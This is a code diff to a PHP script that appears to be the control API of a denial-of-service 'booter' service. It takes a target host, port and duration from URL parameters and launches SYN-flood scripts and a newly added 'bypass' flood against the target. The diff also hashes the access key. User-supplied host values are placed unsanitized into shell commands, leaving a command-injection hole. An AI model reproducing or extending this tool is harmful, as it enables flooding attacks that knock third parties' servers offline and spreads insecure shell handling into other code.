@@ -33,8 +33,8 @@ $method = $_GET['method'];
 $action = $_GET['action'];
 
 $directory = "REPLACEME";
-$array = array("syn", "synpy", "stop");
-$ray = array("etherealhehe");
+$array = array("syn", "synpy", "bypass", "stop");
+$ray = array("b387c979321e6360bc9a3a28fe83eb76");
 
 
 if (!empty($key)) {
@@ -42,7 +42,7 @@ if (!empty($key)) {
     die('Error: API key is empty!');
 }
 
-if (in_array($key, $ray)) {
+if (in_array(md5($key), $ray)) {
 } else {
     die('Error: Incorrect API key!');
 }
@@ -89,15 +89,14 @@ if ($port > 44405) {
 //     die('Error: Port is not in numeric form!');
 // }
 
-
-
-
-
 if ($method == "syn") {
     $command = "screen -dm perl $directory/syn.pl $host $port 55000 $time";
 }
 if ($method == "synpy") {
     $command = "screen -dm python $directory/syn.py $host $port 55000 $time";
+}
+if ($method == "bypass") {
+    $command = "screen -dm python $directory/bypass.pl $host $time";
 }
 if ($method == "stop") {
     $command = "pkill $host -f";
